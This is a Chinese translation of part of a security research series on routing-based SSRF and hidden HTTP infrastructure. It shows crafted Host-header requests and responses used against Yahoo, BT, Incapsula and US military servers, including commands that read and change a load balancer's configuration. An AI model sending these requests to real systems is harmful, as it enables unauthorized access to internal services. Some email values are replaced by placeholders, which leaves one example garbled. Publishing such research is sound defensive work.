# 【技术分享】针对HTTP的隐藏攻击面分析（中）

### 译文声明
本文是翻译文章，原文来源：安全客
原文地址：[请提供具体链接]
译文仅供参考，具体内容及含义以原文为准。
译者：[WisFree](http://bobao.360.cn/member/contribute?uid=2606963099)
预估稿费：200RMB
投稿方式：发送邮件至linwei#360.cn 或登录网页版在线投稿

### 简介
现代Web网站架构中包含多种“隐藏系统”，这些系统不仅为用户提供额外服务，还帮助管理员提取各种分析数据。然而，这些隐藏系统也成为了近年来被忽视的安全漏洞面。

**相关阅读：[【技术分享】针对HTTP的隐藏攻击面分析（上）](http://bobao.360.cn/learning/detail/4218.html)**

### 前文回顾
在上一篇文章中，我们介绍了现代Web应用架构中的隐藏系统和隐藏服务，并概述了本系列文章将使用的工具和技术。接下来，我们将通过实际例子详细说明这些技术的应用。

### 三、请求误传

#### 1. 无效主机
触发回调最简单的方法之一是发送一个错误的HTTP Host头：
```http
GET / HTTP/1.1
Host: uniqid.burpcollaborator.net
Connection: close
```
尽管这项技术已经广为人知多年，但其潜在威胁往往被低估。我利用这一技术成功入侵了美国国防部、我的互联网服务提供商以及哥伦比亚某ISP的共二十七台服务器。为了更好地理解这种漏洞的严重性，让我们看看雅虎的一台内部服务器（存在漏洞，域名为XX.X.XXX.XX:8082）。

初次观察时，我们可能无法确定服务器运行的软件：
```http
GET / HTTP/1.1
Host: XX.X.XXX.XX:8082
HTTP/1.1 200 Connection Established
Date: Tue, 07 Feb 2017 16:32:50 GMT
Transfer-Encoding: chunked
Connection: close
Ok
/ HTTP/1.1 is unavailable
Ok
Unknown Command
Ok
Unknown Command
Ok
Unknown Command
Ok
```

不到一分钟内，我不仅确认了服务器运行的软件，还找到了与之通信的方法，这得益于`HELP`命令：
```http
HELP / HTTP/1.1
Host: XX.X.XXX.XX:8082
HTTP/1.1 200 Connection Established
Date: Tue, 07 Feb 2017 16:33:59 GMT
Transfer-Encoding: chunked
Connection: keep-alive
Ok
  Traffic Server Overseer Port
  commands:
    get 
    set  = ""
    help
    exit
  example:
    Ok
    get proxy.node.cache.contents.bytes_free
    proxy.node.cache.contents.bytes_free = "56616048"
    Ok
  Variable lists are conf/yts/stats records, separated by commas
Ok
Unknown Command
Ok
Unknown Command
Ok
Unknown Command
Ok
```

服务器返回的每一行“Unknown Command”都解析为单独的命令。由于使用的是换行符终止协议，传统的SSRF攻击在此不可行。幸运的是，基于路由的SSRF更具灵活性，允许我通过GET请求发送包含任意命令的POST-style主体：
```http
GET / HTTP/1.1
Host: XX.X.XXX.XX:8082
Content-Length: 34
GET proxy.config.alarm_email
HTTP/1.1 200 Connection Established
Date: Tue, 07 Feb 2017 16:57:02 GMT
Transfer-Encoding: chunked
Connection: keep-alive
Ok
/ HTTP/1.1 is unavailable
Ok
Unknown Command
Ok
proxy.config.alarm_email = PI:EMAIL
```

借助`SET`命令，我可以修改雅虎负载均衡池的配置，包括启用SOCKS代理并提升我的IP地址权限。发现此问题后，我立即报告给了雅虎，并获得了15,000美元的漏洞奖金。几周后，我又用相同方法发现了另一台存在同样漏洞的服务器，再次获得了5,000美元奖金。

#### 2. 分析英国电信（BT）
测试“无效主机”技术后，我发现之前发给不相关公司的Payload竟然从有限的IP池返回Pingback，其中包括cloud.mail.ru。起初我认为这些公司使用相同的云端Web应用防火墙解决方案，但我可以通过它们的内部管理接口发送请求。事实并非如此，这些IP池的反向DNS解析到bn-proxyXX.ealing.ukcore.bt.net，属于我的互联网服务提供商——英国电信集团。

我使用Burp Repeater进行深入分析，响应延迟仅为50ms，这非常可疑，因为请求-响应需要从英国发送到俄罗斯，再经过爱尔兰服务商的数据中心最终回到英国。TCP跟踪路由揭示了真相：当我尝试与cloud.mail.ru建立TCP连接时，连接被我的ISP中断了（流量通过TCP端口443（HTTPS）发送且未被篡改）。这意味着负责篡改流量的实体没有mail.ru的TLS证书，因此拦截并未得到mail.ru的许可。

为了弄清这些系统的用途，我使用Masscan对整个IPv4地址空间进行了ping扫描（TCP端口80，TTL=10）。过滤掉缓存和自托管网站后，我得到了一个完整的目标IP列表，这些IP背后的系统主要用于阻止用户访问受保护内容。访问黑名单中的IP时，请求会被重定向到代理池，以便审查HTTP Host头：
```http
GET / HTTP/1.1
Host: www.icefilms.info
HTTP/1.1 200 OK
...
Access to the websites listed on this page has been blocked pursuant to orders of the high court.
```

虽然可以通过不修改Host头来绕过这种屏蔽机制，但在本系列文章中不做深入探讨。这种设置会导致以下结果：由于虚拟主机的存在，可以将类似Google站点这样的云主机添加到黑名单中，导致所有Google用户和英国电信用户的流量通过代理服务器。从服务器的角度看，所有英国电信用户共享相同的IP地址池，攻击者可以将英国电信的代理IP加入黑名单，影响所有用户的访问。此外，我还利用之前提到的管理员访问漏洞入侵了代理服务器的管理面板，重新配置代理并向数百万英国电信用户的网络流量注入任意内容。

#### 3. 分析METROTEL（哥伦比亚互联网服务提供商）
实际上，哥伦比亚的互联网服务提供商METROTEL也存在上述问题。对于英国电信来说，这些系统的初衷可能是好的，但存在漏洞则另当别论。需要注意的是，除了这些互联网服务提供商外，某些新闻网站（如bbc.co.uk）也存在这些问题。

#### 4. 主机重写
我曾使用这项技术创建用于重置目标用户密码的钓鱼邮件，但需注意，该技术还可用于攻击美国国防部的服务器。一些服务器设置了白名单来过滤Host头，但我们仍可指定主机和Host头的优先级：
```http
GET http://internal-website.mil/ HTTP/1.1
Host: xxxxxxx.mil
Connection: close
```

通过将存在漏洞的前端服务器作为网关，我们可以访问各种有趣的内部站点，如公共论坛的文件传输服务或代码库，这些服务可能存在隐藏的攻击面。

#### 5. 模棱两可的请求
Incapsula是一个提供CDN加速的服务商，其CDN节点主要分布在美国、英国、新加坡、以色列和日本等地，功能类似于CloudFlare。国内用户可以通过指定Incapsula的其他CDN节点来加快网站访问速度并降低流量和其他资源消耗。

Incapsula的云端Web应用防火墙后面有一大批服务器，主要通过检查请求的Host头来确定转发给哪台服务器处理，因此之前介绍的攻击技术在这里不起作用。然而，Incapsula解析Host头的过程非常复杂，还需要指定端口。参考下面发送给incapsula-client.net的请求：
```http
GET / HTTP/1.1
Host: incapsula-client.net:PI:EMAIL
Connection: close
```

incapsula-client.net的后台服务器会将这段输入转换成URL `http://incapsula-client.net:PI:EMAIL/`，我们可以尝试通过用户名`incapsula-client.net`和密码`80`来完成burp-collaborator.net的身份验证。除了暴露这个有趣的攻击面外，该服务还暴露了后台服务器的地址，允许我们直接访问后台服务器以绕过Incapsula的保护机制。

### 总结
在本系列文章的中篇，我们介绍了几种简单方法来暴露目标组织的隐藏服务或隐藏系统。在下一篇文章中，我们将通过实际示例演示如何利用这些技术找到隐藏系统，并利用其中的安全漏洞完成入侵攻击。敬请关注安全客的最新更新。